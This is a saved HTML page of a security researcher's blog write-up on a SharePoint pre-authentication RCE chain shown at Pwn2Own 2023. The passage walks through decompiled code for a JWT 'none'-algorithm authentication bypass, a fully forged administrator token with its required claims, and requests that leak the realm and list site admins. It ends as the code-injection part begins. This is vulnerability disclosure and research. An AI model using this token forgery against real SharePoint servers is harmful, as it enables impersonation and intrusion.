<!DOCTYPE html>
<!-- saved from url=(0063)https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/ -->
<html lang="en" dir="auto"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Brief I may have achieved successful exploitation of a SharePoint target during Pwn2Own Vancouver 2023. While the live demonstration lasted only approximately 30 seconds, it is noteworthy that the process of discovering and crafting the exploit chain consumed nearly a year of meticulous effort and research to complete the full exploit chain.
This exploit chain leverages two vulnerabilities to achieve pre-auth remote code execution (RCE) on the SharePoint server:
 Authentication Bypass ‚Äì An unauthenticated attacker can impersonate as any SharePoint user by spoofing valid JSON Web Tokens (JWTs), using the none signing algorithm to subvert signature validation checks when verifying JWT tokens used for OAuth authentication.">
<meta name="author" content="Nguy·ªÖn Ti·∫øn Giang (Jang)">
<link rel="canonical" href="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/">
<link crossorigin="anonymous" href="https://starlabs.sg/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer="" crossorigin="anonymous" src="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d.download" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/logo-white.png">
<link rel="apple-touch-icon" href="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/logo-white.png">
<link rel="mask-icon" href="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async="" src="./[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955) _ STAR Labs_files/js"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955)">
<meta property="og:description" content="Brief I may have achieved successful exploitation of a SharePoint target during Pwn2Own Vancouver 2023. While the live demonstration lasted only approximately 30 seconds, it is noteworthy that the process of discovering and crafting the exploit chain consumed nearly a year of meticulous effort and research to complete the full exploit chain.
This exploit chain leverages two vulnerabilities to achieve pre-auth remote code execution (RCE) on the SharePoint server:
 Authentication Bypass ‚Äì An unauthenticated attacker can impersonate as any SharePoint user by spoofing valid JSON Web Tokens (JWTs), using the none signing algorithm to subvert signature validation checks when verifying JWT tokens used for OAuth authentication.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/"><meta property="og:image" content="https://starlabs.sg/logo-white.png"><meta property="article:section" content="blog">
<meta property="article:published_time" content="2023-09-25T00:00:00+00:00">
<meta property="article:modified_time" content="2023-09-25T00:00:00+00:00"><meta property="og:site_name" content="STAR Labs">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png">

<meta name="twitter:title" content="[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 &amp; CVE-2023‚Äì24955)">
<meta name="twitter:description" content="Brief I may have achieved successful exploitation of a SharePoint target during Pwn2Own Vancouver 2023. While the live demonstration lasted only approximately 30 seconds, it is noteworthy that the process of discovering and crafting the exploit chain consumed nearly a year of meticulous effort and research to complete the full exploit chain.
This exploit chain leverages two vulnerabilities to achieve pre-auth remote code execution (RCE) on the SharePoint server:
 Authentication Bypass ‚Äì An unauthenticated attacker can impersonate as any SharePoint user by spoofing valid JSON Web Tokens (JWTs), using the none signing algorithm to subvert signature validation checks when verifying JWT tokens used for OAuth authentication.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://starlabs.sg/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 \u0026 CVE-2023‚Äì24955)",
      "item": "https://starlabs.sg/blog/2023/09-sharepoint-pre-auth-rce-chain/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 \u0026 CVE-2023‚Äì24955)",
  "name": "[P2O Vancouver 2023] SharePoint Pre-Auth RCE chain (CVE-2023‚Äì29357 \u0026 CVE-2023‚Äì24955)",
  "description": "Brief I may have achieved successful exploitation of a SharePoint target during Pwn2Own Vancouver 2023. While the live demonstration lasted only approximately 30 seconds, it is noteworthy that the process of discovering and crafting the exploit chain consumed nearly a year of meticulous effort and research to complete the full exploit chain.\nThis exploit chain leverages two vulnerabilities to achieve pre-auth remote code execution (RCE) on the SharePoint server:\n Authentication Bypass \u0026ndash; An unauthenticated attacker can impersonate as any SharePoint user by spoofing valid JSON Web Tokens (JWTs), using the none signing algorithm to subvert signature validation checks when verifying JWT tokens used for OAuth authentication.",
  "keywords": [
    
  ],
  "articleBody": "Brief I may have achieved successful exploitation of a SharePoint target during Pwn2Own Vancouver 2023. While the live demonstration lasted only approximately 30 seconds, it is noteworthy that the process of discovering and crafting the exploit chain consumed nearly a year of meticulous effort and research to complete the full exploit chain.\nThis exploit chain leverages two vulnerabilities to achieve pre-auth remote code execution (RCE) on the SharePoint server:\n Authentication Bypass ‚Äì An unauthenticated attacker can impersonate as any SharePoint user by spoofing valid JSON Web Tokens (JWTs), using the none signing algorithm to subvert signature validation checks when verifying JWT tokens used for OAuth authentication. This vulnerability has been found right after I started this project for two days. Code Injection ‚Äì A SharePoint user with Sharepoint Owners permission can inject arbitrary code by replacing /BusinessDataMetadataCatalog/BDCMetadata.bdcm file in the web root directory to cause compilation of the injected code into an assembly that is subsequently executed by SharePoint. This vulnerability was found on Feb 2022.  The specific part of the Authentication Bypass vuln is: it can access to SharePoint API only. So, the most difficult part is to find the post-auth RCE chain that using SP API.\nAffected products/Tested version  SharePoint 2019 Tested Version: SharePoint 2019 (16.0.10396.20000) with March 2023 patch (KB5002358 and KB5002357) Patch download:  https://www.microsoft.com/en-us/download/details.aspx?id=105064 https://www.microsoft.com/en-us/download/details.aspx?id=105078    Vulnerability #1: SharePoint Application Authentication Bypass With the default SharePoint setup configuration, almost every requests send to SharePoint site will require NTLM Auth to process. While analyzing web config file, I‚Äôve realized that there are at least 4 authentication types we can use.    Auth Module Handled by class     FederatedAuthentication SPFederationAuthenticationModule   SessionAuthentication SPSessionAuthenticationModule   SPApplicationAuthentication SPApplicationAuthenticationModule   SPWindowsClaimsAuthentication SPWindowsClaimsAuthenticationHttpModule    I started to analyzing these modules one by one, then I‚Äôve found something interesting in the SPApplicationAuthenticationModule.\nThis module registers the SPApplicationAuthenticationModule.AuthenticateRequest() method for the Http event AuthenticateRequest:\nnamespace Microsoft.SharePoint.IdentityModel { internal sealed class SPApplicationAuthenticationModule : IHttpModule { public void Init(HttpApplication context) { if (context == null) { throw new ArgumentNullException(\"context\"); } context.AuthenticateRequest += this.AuthenticateRequest; context.PreSendRequestHeaders += this.PreSendRequestHeaders; } //... } //... } So everytime we try to send HTTP request to SharePoint Site, this method will be called to handle the authentication logic! Take a closer look at the SPApplicationAuthenticationModule.AuthenticateRequest() method, SPApplicationAuthenticationModule.ShouldTryApplicationAuthentication() will be called to check if the current URL is permitted to use OAuth as the authentication method:\nprivate void AuthenticateRequest(object sender, EventArgs e) { if (!SPApplicationAuthenticationModule.ShouldTryApplicationAuthentication(context, spfederationAuthenticationModule)) // [1] { spidentityReliabilityMonitorAuthenticateRequest.ExpectedFailure(TaggingUtilities.ReserveTag(18990616U), \"Not an OAuthRequest.\"); //... } else { bool flag = this.ConstructIClaimsPrincipalAndSetThreadIdentity(httpApplication, context, spfederationAuthenticationModule, out text); // [2] if (flag) { //... spidentityReliabilityMonitorAuthenticateRequest.Success(null); } else { //... OAuthMetricsEventHelper.LogOAuthMetricsEvent(text, QosErrorType.ExpectedFailure, \"Can't sign in using token.\"); } //... } //... } At [1], If the request URL contains one of these patterns, it will be allowed to use OAuth authentication:\n /_vti_bin/client.svc /_vti_bin/listdata.svc /_vti_bin/sites.asmx /_api/ /_vti_bin/ExcelRest.aspx /_vti_bin/ExcelRest.ashx /_vti_bin/ExcelService.asmx /_vti_bin/PowerPivot16/UsageReporting.svc /_vti_bin/DelveApi.ashx /_vti_bin/DelveEmbed.ashx /_layouts/15/getpreview.ashx /_vti_bin/wopi.ashx /_layouts/15/userphoto.aspx /_layouts/15/online/handlers/SpoSuiteLinks.ashx /_layouts/15/wopiembedframe.aspx /_vti_bin/homeapi.ashx /_vti_bin/publiccdn.ashx /_vti_bin/TaxonomyInternalService.json/GetSuggestions /_layouts/15/download.aspx /_layouts/15/doc.aspx /_layouts/15/WopiFrame.aspx  When the above condition is satisfied, SPApplicationAuthenticationModule.ConstructIClaimsPrincipalAndSetThreadIdentity() will invoked to continue processing the authentication request at [2].\nThe relevant code for the SPApplicationAuthenticationModule.ConstructIClaimsPrincipalAndSetThreadIdentity() method is shown below:\nprivate bool ConstructIClaimsPrincipalAndSetThreadIdentity(HttpApplication httpApplication, HttpContext httpContext, SPFederationAuthenticationModule fam, out string tokenType) { //... if (!this.TryExtractAndValidateToken(httpContext, out spincomingTokenContext, out spidentityProofToken)) // [3] { ULS.SendTraceTag(832154U, ULSCat.msoulscat_WSS_ApplicationAuthentication, ULSTraceLevel.Medium, \"SPApplicationAuthenticationModule: Couldn't find a valid token in the request.\"); return false; } //... if (spincomingTokenContext.TokenType != SPIncomingTokenType.Loopback \u0026\u0026 httpApplication != null \u0026\u0026 !SPSecurityTokenServiceManager.LocalOrThrow.AllowOAuthOverHttp \u0026\u0026 !Uri.UriSchemeHttps.Equals(SPAlternateUrl.ContextUri.Scheme, StringComparison.OrdinalIgnoreCase)) // [4] { SPApplicationAuthenticationModule.SendSSLRequiredResponse(httpApplication); } JsonWebSecurityToken jsonWebSecurityToken = spincomingTokenContext.SecurityToken as JsonWebSecurityToken; //... this.SignInProofToken(httpContext, jsonWebSecurityToken, spidentityProofToken); // [5] //... } Note: The code at [4] and [5] will be discussed at a much later stage.\nAt [3], the SPApplicationAuthenticationModule.TryExtractAndValidateToken() method will try to parse the authentication token from HTTP request and perform validation checks:\nprivate bool TryExtractAndValidateToken(HttpContext httpContext, out SPIncomingTokenContext tokenContext, out SPIdentityProofToken identityProofToken) { //... if (!this.TryParseOAuthToken(httpContext.Request, out text)) // [6] { return false; } //... if (VariantConfiguration.IsGlobalExpFeatureToggleEnabled(ExpFeatureId.AuthZenProofToken) \u0026\u0026 this.TryParseProofToken(httpContext.Request, out text2)) { SPIdentityProofToken spidentityProofToken = SPIdentityProofTokenUtilities.CreateFromJsonWebToken(text2, text); // [7] } if (VariantConfiguration.IsGlobalExpFeatureToggleEnabled(ExpFeatureId.AuthZenProofToken) \u0026\u0026 !string.IsNullOrEmpty(text2)) { Microsoft.IdentityModel.Tokens.SecurityTokenHandler identityProofTokenHandler = SPClaimsUtility.GetIdentityProofTokenHandler(); StringBuilder stringBuilder = new StringBuilder(); using (XmlWriter xmlWriter = XmlWriter.Create(stringBuilder)) { identityProofTokenHandler.WriteToken(xmlWriter, spidentityProofToken); // [8] } SPIdentityProofToken spidentityProofToken2 = null; using (XmlReader xmlReader = XmlReader.Create(new StringReader(stringBuilder.ToString()))) { spidentityProofToken2 = identityProofTokenHandler.ReadToken(xmlReader) as SPIdentityProofToken; } ClaimsIdentityCollection claimsIdentityCollection = null; claimsIdentityCollection = identityProofTokenHandler.ValidateToken(spidentityProofToken2); // [9] tokenContext = new SPIncomingTokenContext(spidentityProofToken2.IdentityToken, claimsIdentityCollection); identityProofToken = spidentityProofToken2; tokenContext.IsProofTokenScenario = true; SPClaimsUtility.VerifyProofTokenEndPointUrl(tokenContext); // [10] SPIncomingServerToServerProtocolIdentityHandler.SetRequestIncomingOAuthIdentityType(tokenContext, httpContext.Request); SPIncomingServerToServerProtocolIdentityHandler.SetRequestIncomingOAuthTokenType(tokenContext, httpContext.Request); } } At [6], the TryParseOAuthToken() method will attempt to retrieve the OAuth access token from HTTP request from either the query string parameter access_token or the Authorization header, and store it into the text variable.\nFor example, the HTTP request will resemble the following:\nGET /_api/web/ HTTP/1.1 Connection: close Authorization: Bearer  User-Agent: python-requests/2.27.1 Host: sharepoint Similarly, after extracting the OAuth access token from the HTTP request, the TryParseProofToken() method will attempt to retrieve the proof token from HTTP request from either the query string parameter prooftoken or the X-PROOF_TOKEN header, and store it into the text2 variable.\nAt [7], both tokens are then passed to the SPIdentityProofTokenUtilities.CreateFromJsonWebToken() method as arguments.\nThe relevant code of the SPIdentityProofTokenUtilities.CreateFromJsonWebToken() method is shown below:\ninternal static SPIdentityProofToken CreateFromJsonWebToken(string proofTokenString, string identityTokenString) { RequestApplicationSecurityTokenResponse.NonValidatingJsonWebSecurityTokenHandler nonValidatingJsonWebSecurityTokenHandler = new RequestApplicationSecurityTokenResponse.NonValidatingJsonWebSecurityTokenHandler(); SecurityToken securityToken = nonValidatingJsonWebSecurityTokenHandler.ReadToken(proofTokenString); // [11] if (securityToken == null) { ULS.SendTraceTag(3536843U, ULSCat.msoulscat_WSS_ApplicationAuthentication, ULSTraceLevel.Unexpected, \"CreateFromJsonWebToken: Proof token is not a valid JWT string.\"); throw new InvalidOperationException(\"Proof token is not JWT\"); } SecurityToken securityToken2 = nonValidatingJsonWebSecurityTokenHandler.ReadToken(identityTokenString); // [12] if (securityToken2 == null) { ULS.SendTraceTag(3536844U, ULSCat.msoulscat_WSS_ApplicationAuthentication, ULSTraceLevel.Unexpected, \"CreateFromJsonWebToken: Identity token is not a valid JWT string.\"); throw new InvalidOperationException(\"Identity token is not JWT\"); } //... JsonWebSecurityToken jsonWebSecurityToken = securityToken2 as JsonWebSecurityToken; if (jsonWebSecurityToken == null || !jsonWebSecurityToken.IsAnonymousIdentity()) { spidentityProofToken = new SPIdentityProofToken(securityToken2, securityToken); try { new SPAudienceValidatingIdentityProofTokenHandler().ValidateAudience(spidentityProofToken); // [13] return spidentityProofToken; } //... } //... } At a quick glance, it can be inferred that both the access token (passed as identityTokenString parameter) and the proof token (passed as proofTokenString parameter) are expected to be JSON Web Tokens (JWTs).\nAn instance of the RequestApplicationSecurityTokenResponse.NonValidatingJsonWebSecurityTokenHandler type is initialized to perform token parsing and validation before calling the nonValidatingJsonWebSecurityTokenHandler.ReadToken() method at [11].\nThe RequestApplicationSecurityTokenResponse.NonValidatingJsonWebSecurityTokenHandler type is a sub-type of JsonWebSecurityTokenHandler. Since RequestApplicationSecurityTokenResponse.NonValidatingJsonWebSecurityTokenHandler does not override the ReadToken() method, calling nonValidatingJsonWebSecurityTokenHandler.ReadToken() method is equivalent to calling JsonWebSecurityTokenHandler.ReadToken() (wrapper function for the JsonWebSecurityTokenHandler.ReadTokenCore() method).\nThe relevant code of JsonWebSecurityTokenHandler that validates the access and proof tokens at [11] and at [12] respectively is shown below:\npublic virtual SecurityToken ReadToken(string token) { return this.ReadTokenCore(token, false); } public virtual bool CanReadToken(string token) { Utility.VerifyNonNullOrEmptyStringArgument(\"token\", token); return this.IsJsonWebSecurityToken(token); } private bool IsJsonWebSecurityToken(string token) { return Regex.IsMatch(token, \"^[A-Za-z0-9-_]+\\\\.[A-Za-z0-9-_]+\\\\.[A-Za-z0-9-_]*$\"); } private SecurityToken ReadTokenCore(string token, bool isActorToken) { Utility.VerifyNonNullOrEmptyStringArgument(\"token\", token); if (!this.CanReadToken(token)) // [14] { throw new SecurityTokenException(\"Unsupported security token.\"); } string[] array = token.Split(new char[] { '.' }); string text = array[0]; // JWT Header string text2 = array[1]; // JWT Payload (JWS Claims) string text3 = array[2]; // JWT Signature Dictionarystring, string dictionary = new Dictionarystring, string(StringComparer.Ordinal); dictionary.DecodeFromJson(Base64UrlEncoder.Decode(text)); Dictionarystring, string dictionary2 = new Dictionarystring, string(StringComparer.Ordinal); dictionary2.DecodeFromJson(Base64UrlEncoder.Decode(text2)); string text4; dictionary.TryGetValue(\"alg\", out text4); // [15] SecurityToken securityToken = null; if (!StringComparer.Ordinal.Equals(text4, \"none\")) // [16] { if (string.IsNullOrEmpty(text3)) { throw new SecurityTokenException(\"Missing signature.\"); } SecurityKeyIdentifier signingKeyIdentifier = this.GetSigningKeyIdentifier(dictionary, dictionary2); SecurityToken securityToken2; base.Configuration.IssuerTokenResolver.TryResolveToken(signingKeyIdentifier, out securityToken2); if (securityToken2 == null) { throw new SecurityTokenException(\"Invalid JWT token. Could not resolve issuer token.\"); } securityToken = this.VerifySignature(string.Format(CultureInfo.InvariantCulture, \"{0}.{1}\", new object[] { text, text2 }), text3, text4, securityToken2); } //... } At [14], the JsonWebSecurityTokenHandler.CanReadToken() method is first invoked to ensure that the token matches the regular expression ^[A-Za-z0-9-_]+\\\\.[A-Za-z0-9-_]+\\\\.[A-Za-z0-9-_]*$. Basically, this checks that the user-supplied token resembles a valid JWT token with each portion (i.e. header, payload and signature) being Base64-encoded.\nAfterwards, the header, payload and signature portions of the JWT token are extracted. Base64-decoding is then performed on header and payload portions before parsing them as JSON objects.\nAt [15], the alg field (i.e. signing algorithm) is extracted from the header portion. For example, the value for the alg field is HS256 if the Base64-decoded header portion is:\n{ \"alg\": \"HS256\", \"typ\": \"JWT\" } The first part of the root cause of this authentication bypass vulnerability can be found at [16] ‚Äì there is a logic flaw when validating the signature of the JWT token provided. If the alg field is not set to none, the method VerifySignature() is called to verify the signature of JWT token provided. However, if the alg is none, the signature validation check in JsonWebSecurityTokenHandler.ReadTokenCore() is skipped!\nBack at [13], SPAudienceValidatingIdentityProofTokenHandler.ValidateAudience() performs validation checks against the aud (audience) field from the header portion of the proof token supplied.\nBelow is an example of a valid value for the aud field:\n00000003-0000-0ff1-ce00-000000000000/splab@3b80be6c-6741-4135-9292-afed8df596af The format of the aud field is /@:\n The static value 00000003-0000-0ff1-ce00-000000000000 is accepted as a valid  for all SharePoint on-premise instances.  refers to the hostname of the SharePoint server (target) for the current HTTP request (e.g. splab) The  (e.g. 3b80be6c-6741-4135-9292-afed8df596af) can be obtained from the WWW-Authenticate response header by sending a request to /_api/web/ with header Authorization: Bearer .  Below is an example of the HTTP request used to obtain the  required to construct a valid value for the aud field:\nGET /_api/web/ HTTP/1.1 Connection: close User-Agent: python-requests/2.27.1 Host: sharepoint Authorization: Bearer  The HTTP response will include the  in the WWW-Authenticate response header:\nHTTP/1.1 401 Unauthorized Content-Type: text/plain; charset=utf-8 //... WWW-Authenticate: Bearer realm=\"3b80be6c-6741-4135-9292-afed8df596af\",client_id=\"00000003-0000-0ff1-ce00-000000000000\",trusted_issuers=\"00000003-0000-0ff1-ce00-000000000000@3b80be6c-6741-4135-9292-afed8df596af\" After that, a new SPIdentityProofToken will be created from user-supplied access and proof tokens, and the control flows to [8]. At [8], identityProofTokenHandler is returned by the SPClaimsUtility.GetIdentityProofTokenHandler() method:\ninternal static SecurityTokenHandler GetIdentityProofTokenHandler() { //... return securityTokenHandlerCollection.Where((SecurityTokenHandler h) = h.TokenType == typeof(SPIdentityProofToken)).FirstSecurityTokenHandler(); } The implementation of the SPClaimsUtility.GetIdentityProofTokenHandler() method implies that the identityProofTokenHandler returned will be an instance of SPIdentityProofTokenHandler.\nAt [9], identityProofTokenHandler.ValidateToken(spidentityProofToken2) will then flow to SPIdentityProofTokenHandler.ValidateTokenIssuer().\nIn the SPIdentityProofTokenHandler.ValidateTokenIssuer() method, notice that if the token parameter is a hashed proof token, validation of the issuer field will be skipped!\ninternal void ValidateTokenIssuer(JsonWebSecurityToken token) { bool flag = VariantConfiguration.IsGlobalExpFeatureToggleEnabled(ExpFeatureId.AuthZenHashedProofToken); if (flag \u0026\u0026 SPIdentityProofTokenUtilities.IsHashedProofToken(token)) { ULS.SendTraceTag(21559514U, SPJsonWebSecurityBaseTokenHandler.Category, ULSTraceLevel.Medium, \"Found hashed proof tokem, skipping issuer validation.\"); return; } //... this.ValidateTokenIssuer(token.ActorToken.IssuerToken as X509SecurityToken, token.ActorToken.Issuer); } The implementation of the SPIdentityProofTokenUtilities.IsHashedProofToken() method is shown below:\ninternal static bool IsHashedProofToken(JsonWebSecurityToken token) { if (token == null) { return false; } if (token.Claims == null) { return false; } JsonWebTokenClaim singleClaim = token.Claims.GetSingleClaim(\"ver\"); return singleClaim != null \u0026\u0026 singleClaim.Value.Equals(SPServerToServerProtocolConstants.HashedProofToken, StringComparison.InvariantCultureIgnoreCase); } Setting the ver field to hashedprooftoken in the payload portion of the JWT token makes the SPIdentityProofTokenUtilities.IsHashedProofToken() method return true, allowing the issuer field validation check to be subverted.\nBack to [10], SPClaimsUtility.VerifyProofTokenEndPointUrl(tokenContext) is called to verify the hash for current URL. The required value to be stored in the endpointurl field in the JWT payload portion can be derived by computing:\nbase64_encode(sha256(request_url)) After executing SPApplicationAuthenticationModule.TryExtractAndValidateToken(), the code flows to the SPApplicationAuthenticationModule.ConstructIClaimsPrincipalAndSetThreadIdentity() method and reaches [4]:\nprivate bool ConstructIClaimsPrincipalAndSetThreadIdentity(HttpApplication httpApplication, HttpContext httpContext, SPFederationAuthenticationModule fam, out string tokenType) { //... if (!this.TryExtractAndValidateToken(httpContext, out spincomingTokenContext, out spidentityProofToken)) // [3] //... if (spincomingTokenContext.TokenType != SPIncomingTokenType.Loopback \u0026\u0026 httpApplication != null \u0026\u0026 !SPSecurityTokenServiceManager.LocalOrThrow.AllowOAuthOverHttp \u0026\u0026 !Uri.UriSchemeHttps.Equals(SPAlternateUrl.ContextUri.Scheme, StringComparison.OrdinalIgnoreCase)) // [4] { SPApplicationAuthenticationModule.SendSSLRequiredResponse(httpApplication); } JsonWebSecurityToken jsonWebSecurityToken = spincomingTokenContext.SecurityToken as JsonWebSecurityToken; //... this.SignInProofToken(httpContext, jsonWebSecurityToken, spidentityProofToken); // [5] If the spincomingTokenContext.TokenType is not spincomingTokenContext.Loopback and the current HTTP request is not encrypted by SSL, an exception will be thrown. As such, the isloopback claim needs to be set to true within the spoofed JWT token to make spincomingTokenContext.TokenType == spincomingTokenContext.Loopback, thereby ensuring that no exceptions are thrown and the code continues to execute normally.\nSubsequently, at [5], the token will be passed into SPApplicationAuthenticationModule.SignInProofToken().\nprivate void SignInProofToken(HttpContext httpContext, JsonWebSecurityToken token, SPIdentityProofToken proofIdentityToken) { SecurityContext.RunAsProcess(delegate { Uri contextUri = SPAlternateUrl.ContextUri; SPAuthenticationSessionAttributes? spauthenticationSessionAttributes = new SPAuthenticationSessionAttributes?(SPAuthenticationSessionAttributes.IsBrowser); SecurityToken securityToken = SPSecurityContext.SecurityTokenForProofTokenAuthentication(proofIdentityToken.IdentityToken, proofIdentityToken.ProofToken, spauthenticationSessionAttributes); IClaimsPrincipal claimsPrincipal = SPFederationAuthenticationModule.AuthenticateUser(securityToken); //... }); } This method will create an instance of SecurityTokenForContext from the user-supplied JWT token and send it to Security Token Service (STS) for authentication. This is the most important part of the whole vulnerability ‚Äì if the STS accepts the spoofed JWT token, then it is possible to impersonate as any SharePoint user!\nFor brevity, the spoofed JWT token should be resemble the following:\neyJhbGciOiAibm9uZSJ9.eyJpc3MiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAiLCJhdWQiOiAgIjAwMDAwMDAzLTAwMDAtMGZmMS1jZTAwLTAwMDAwMDAwMDAwMC9zcGxhYkAzYjgwYmU2Yy02NzQxLTQxMzUtOTI5Mi1hZmVkOGRmNTk2YWYiLCJuYmYiOiIxNjczNDEwMzM0IiwiZXhwIjoiMTY5MzQxMDMzNCIsIm5hbWVpZCI6ImMjLnd8QWRtaW5pc3RyYXRvciIsICAgImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vc2hhcmVwb2ludC8yMDA5LzA4L2NsYWltcy91c2VybG9nb25uYW1lIjoiQWRtaW5pc3RyYXRvciIsICAgImFwcGlkYWNyIjoiMCIsICJpc3VzZXIiOiIwIiwgImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vb2ZmaWNlLzIwMTIvMDEvbmFtZWlkaXNzdWVyIjoiQWNjZXNzVG9rZW4iLCAgInZlciI6Imhhc2hlZHByb29mdG9rZW4iLCJlbmRwb2ludHVybCI6ICJGVkl3QldUdXVXZnN6TzdXWVJaWWlvek1lOE9hU2FXTy93eURSM1c2ZTk0PSIsIm5hbWUiOiJmI3h3fEFkbWluaXN0cmF0b3IiLCJpZGVudGl0eXByb3ZpZGVyIjoid2luZE93czphYWFhYSIsInVzZXJpZCI6ImFzYWFkYXNkIn0.YWFh The Base64-decoded portions of the spoofed JWT token is shown below:\n Header: {\"alg\": \"none\"} Payload: {\"iss\":\"00000003-0000-0ff1-ce00-000000000000\",\"aud\": \"00000003-0000-0ff1-ce00-000000000000/splab@3b80be6c-6741-4135-9292-afed8df596af\",\"nbf\":\"1673410334\",\"exp\":\"1693410334\",\"nameid\":\"c#.w|Administrator\", \"http://schemas.microsoft.com/sharepoint/2009/08/claims/userlogonname\":\"Administrator\", \"appidacr\":\"0\", \"isuser\":\"0\", \"http://schemas.microsoft.com/office/2012/01/nameidissuer\":\"AccessToken\", \"ver\":\"hashedprooftoken\",\"endpointurl\": \"FVIwBWTuuWfszO7WYRZYiozMe8OaSaWO/wyDR3W6e94=\",\"name\":\"f#xw|Administrator\",\"identityprovider\":\"windOws:aaaaa\",\"userid\":\"asaadasdIn0  Note that the nameid field will need to be modified to impersonate the corresponding user in the SharePoint site.\n So we‚Äôve got an authentication bypass, but it may require to know at least one username exists in the SharePoint site. If not, SharePoint Site will reject the authentication and we can‚Äôt access to any feature. At first, I thought that problem was easy to solve because the user ‚ÄúAdministrator‚Äù exists in every windows server 2022 instance. But it‚Äôs not! . . Yes, we can assume that user ‚ÄúAdministrator‚Äù exists in every windows server 2022 instance, but that‚Äôs not what we need. With a correctly configured SharePoint instance:\n The SharePoint Service user should not be a ‚Äúbuilt-in administrators‚Äù Also the Site Admin user should not be the ‚Äúbuilt-in administrators‚Äù Only the ‚ÄúFarm Administrator‚Äù need to be the ‚Äúbuilt-in administrators‚Äù of the SharePoint Server  That means in the Pwn2Own setup, the ‚ÄúAdministrator‚Äù account will not be a SharePoint Site Member.\nThis part of the exploit took me a few days of reading ZDI‚Äôs series blog post about SharePoint again and again, until i realized this line: This entrypoint /my didn‚Äôt exist in my SharePoint instance. After searching for a while, I‚Äôve found out they (team ZDI) use the Initial Farm Configuration Wizard to setup the SharePoint server instead of configuring it manually (like what i thought/did). While using the Initial Farm Configuration Wizard, many other feature will be enabled, User Profile Service is the service responsible for the entrypoint /my. This entrypoint has the Read Permission granted to Authenticated users, which mean any authenticated users can access to this site, get user list and admin username.\nBy using the authentication bypass in My Site site,\n At first request, we can first impersonate any users on windows, even local users like NT AUTHORITY\\LOCAL SERVICE, NT AUTHORITY\\SYSTEM. After authenticated, get site admin by using ListData service at: /my/_vti_bin/listdata.svc/UserInformationList?$filter=IsSiteAdmin eq true  Then we can impersonate Site Admin user and perform any further action!\nVulnerability #2: Code Injection in DynamicProxyGenerator.GenerateProxyAssembly() As mentioned at the beginning, although we can impersonate as any user, but limited only in SharePoint API. I‚Äôve been searching back old SharePoint vuln but can‚Äôt find any vulnerability that reachable via API (or at least i don‚Äôt know how at that time). Well, then it took me half of 2022 to read SharePoint API source code and end up with this vulnerability! The code injection vulnerability exists in DynamicProxyGenerator.GenerateProxyAssembly() method. The relevant portion of the aforesaid method‚Äôs implementation is shown below:\n//Microsoft.SharePoint.BusinessData.SystemSpecific.WebService.DynamicProxyGenerator public virtual Assembly GenerateProxyAssembly(DiscoveryClientDocumentCollection serviceDescriptionDocuments, string proxyNamespaceName, string assemblyPathAndName, string protocolName, out string sourceCode) { //... CodeNamespace codeNamespace = new CodeNamespace(proxyNamespaceName); // 